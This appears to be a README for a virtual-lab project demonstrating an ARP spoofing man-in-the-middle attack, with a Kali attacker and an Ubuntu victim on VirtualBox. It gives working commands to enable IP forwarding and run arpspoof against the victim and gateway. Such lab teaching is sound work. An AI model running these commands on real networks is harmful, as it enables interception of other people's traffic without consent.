# ARP Spoofing Attack – Virtual Lab Demonstration

## 📌 Project Title
Demonstration of ARP Spoofing Attack in a Virtualised Network Environment

## 📖 Description
This project demonstrates an ARP Spoofing (ARP Poisoning) attack in a controlled
virtual lab environment. The attack exploits the lack of authentication in the
Address Resolution Protocol (ARP), allowing an attacker to perform a
Man-in-the-Middle (MITM) attack.

The demonstration is performed using Kali Linux (Attacker) and Ubuntu Linux
(Victim) running on Oracle VirtualBox.

---

## 🖥️ Lab Setup

| Role | Operating System | IP Address |
|----|----|----|
| Attacker | Kali Linux | 192.168.56.101 |
| Victim | Ubuntu Linux | 192.168.56.102 |
| Gateway | Virtual Router | 192.168.56.1 |

Network Type: Host-Only / Bridged Adapter

---

## ⚙️ Tools Used
- Kali Linux
- Ubuntu Linux
- VirtualBox
- arpspoof (dsniff)
- iproute2
- arp utilities

---

## 🧪 Attack Steps

### 1. Check network configuration
```bash
ip a
ip route
```
### 2. Enable IP forwarding on attacker
```bash
sudo sysctl -w net.ipv4.ip_forward=1
```
### 3. Launch ARP Spoofing attack
```bash
sudo arpspoof -i eth0 -t 192.168.56.102 192.168.56.1
```
